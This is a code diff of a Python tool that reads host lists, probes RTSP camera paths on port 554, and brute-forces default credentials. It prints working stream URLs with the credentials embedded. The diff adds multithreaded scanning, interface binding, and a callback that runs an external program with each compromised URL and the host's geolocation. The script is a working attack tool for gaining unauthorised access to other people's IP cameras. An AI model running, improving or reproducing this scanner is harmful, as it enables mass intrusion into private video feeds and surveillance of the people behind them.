@@ -1,11 +1,16 @@
 #!/usr/bin/env python
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
 from pathlib import Path
 import re
-from socket import SocketIO, create_connection, timeout
+from socket import SOL_SOCKET, SO_BINDTODEVICE, SocketIO, create_connection, timeout
+from subprocess import Popen
 from time import sleep
 
 from fire import Fire
+from tqdm import tqdm
+
+from lib.utils import geoip_str_online
 
 
 fake_path = '/f4k3p4th'
@@ -32,7 +37,6 @@ def query(connection, url):
 
     try:
         connection.sendall(request.encode())
-        # TODO: deal w/unicode decode err
         response = connection.recv(1024).decode()
         header_matches = header_re.findall(response)
         if header_matches:
@@ -43,13 +47,12 @@ def query(connection, url):
         pass
     except timeout:
         pass
+    except ConnectionResetError:
+        pass
+    except UnicodeDecodeError:
+        pass
     except Exception as e:
         print(repr(e))
-        pass
-
-    try:
-        connection.close()
-    except:
         pass
 
     return 500
@@ -61,86 +64,115 @@ def get_url(host, port=554, path='', cred=''):
     return f'rtsp://{cred}{host}:{port}{path}'
 
 
-def connect(host, port) -> SocketIO:
+def connect(host, port, interface) -> SocketIO:
     retries = 3
     while retries:
         try:
-            return create_connection((host, int(port)), 3)
+            c = create_connection((host, int(port)), 3)
+            if interface:
+                c.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, interface.encode())
+            return c
         except KeyboardInterrupt:
             raise
         except:
             sleep(1.5/retries)
             retries -= 1
-            print('Retry')
 
 
-def process_target(host, port):
-    netloc = f'{host}:{port}'
-    print('\n* Connecting to', netloc)
+def process_callback(callback, host, url):
+    Popen([callback, url, geoip_str_online(host)])
 
-    connection = connect(host, port)
+
+def process_target(target_params):
+    host, port, single_path, interface, callback = target_params
+    connection = connect(host, port, interface)
+
+    results = []
 
     if not connection:
-        print('- No connection', netloc)
-        return  # next host
-
-    print('+ Connected', netloc)
+        return results  # next host
 
     for path in paths:
         p_url = get_url(host, port, path)
         code = query(connection, p_url)
 
-        # if error, but not for fake path (weak app)
-        if code >= 500 and path != fake_path:
-            print(f'  ! {path}')
-            break  # first request fail, cant continue
+        if code >= 500:
+            connection.close()
+            return results  # first request fail, cant continue
 
         if code not in [200, 401, 403]:
-            print(f'  - {path}')
             continue
 
         if path == fake_path:
-            print(f'  ! Fake cam')
             break
 
-        print(f'  + {path}')
-
         if code == 200:
-            print(p_url)
+            results.append(p_url)
+            if callback:
+                process_callback(callback, host, p_url)
+            if single_path:
+                connection.close()
+                return results
             continue
 
         for cred in creds:
             c_url = get_url(host, port, path, cred)
             code = query(connection, c_url)
             if code >= 500:
-                print(f'    ! {cred}')
-                break  # something goes wrong =(
+                connection.close()
+                return results  # something goes wrong =(
 
             if code != 200:
-                print(f'    - {cred}')
                 continue  # access denied
 
-            print(f'    + {cred}')
-            print(c_url)
+            results.append(c_url)
+            if callback:
+                process_callback(callback, host, c_url)
+            if single_path:
+                connection.close()
+                return results
             break  # one cred per path is enough
 
-    print('i Close connection')
     connection.close()
+    return results
 
 
-def main(H=''):
+def main(H='', w=None, sp=False, i='', cb=''):
     hosts_file = H or local_dir / 'hosts_554.txt'
 
-    with open(hosts_file) as hf:
-        for ln in hf:
-            host = ln.rstrip()
-            port = 554
+    with ThreadPoolExecutor(w) as ex:
+        with open(hosts_file) as hf:
+            futures = {}
 
-            if ':' in host:
-                host, port = host.split(':')
+            for ln in hf:
+                host = ln.rstrip()
+                port = 554
 
-            process_target(host, port)
+                if ':' in host:
+                    host, port = host.split(':')
+
+                arg = (host, port, sp, i, cb)
+
+                future = ex.submit(process_target, arg)
+                futures[future] = arg
+
+            results = []
+
+            with tqdm(total=len(futures)) as pb:
+                for future in as_completed(futures):
+                    host, port, *_ = futures[future]
+                    res = future.result()
+                    pb.update()
+                    for r in res:
+                        results.append(r)
+
+            for r in results:
+                print(r)
 
 
 if __name__ == "__main__":
-    Fire(main)
+    try:
+        Fire(main)
+    except KeyboardInterrupt:
+        print('Interrupted by user')
+        exit(130)
